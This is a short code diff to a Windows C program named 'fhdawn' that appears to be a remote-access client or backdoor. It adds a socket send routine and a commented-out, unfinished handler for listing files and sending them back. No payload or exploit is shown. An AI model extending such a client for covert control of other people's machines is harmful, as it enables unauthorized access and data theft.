@@ -1,13 +1,13 @@
 /*
 Author: Fahad (QuantumCore)
-fhdawn.h (c) 2020
+connect.c (c) 2020
 Created:  2020-08-15T15:27:04.427Z
 Modified: -
 */
 
 #include "fhdawn.h"
 
-
+// By @augustgl
 int sockprintf(SOCKET sock, const char* words, ...) {
     static char textBuffer[BUFFER];
     va_list args;
@@ -25,6 +25,23 @@ void REConnect(void)
     MainConnect();
 }
 
+void sockSend(const char* data)
+{
+    int lerror = WSAGetLastError();
+	int totalsent = 0;
+	int buflen = strlen(data);
+	while (buflen > totalsent) {
+		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
+		if (lerror == WSAECONNRESET)
+		{
+			connected = false;
+		}
+		if (r < 0) return;
+		totalsent += r;
+	}
+	return;
+}
+
 void fhdawn_main(void)
 {
     while(connected)
@@ -36,8 +53,26 @@ void fhdawn_main(void)
             connected = FALSE;
         }
 
-        ExecSock();
+        // if(strcmp(recvbuf, "ls") == 0)
+        // {
+        //     WIN32_FIND_DATA data;
+        //     HANDLE hFind = FindFirstFile("*", &data);
+        //     char list[BUFFER] = {0}; memset(list, '\0', BUFFER);
+        //     if(hFind != INVALID_HANDLE_VALUE){
+        //         do{
+        //             if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
+        //                 list += data.
+        //             } else {
+        //                 snprintf(list, BUFFER, "[FILE] %s\n", data.cFileName);
+        //             }
+        //         } while(FindNextFile(hFind, &data));
 
+        //     } else {
+        //         sockprintf(sockfd, "[Error] Failed to get files in Directory, Error : %ld\n", GetLastError());
+        //     }
+
+        //     send(sockfd, list, BUFFER, 0);
+        ExecSock();
     }    
 }
 
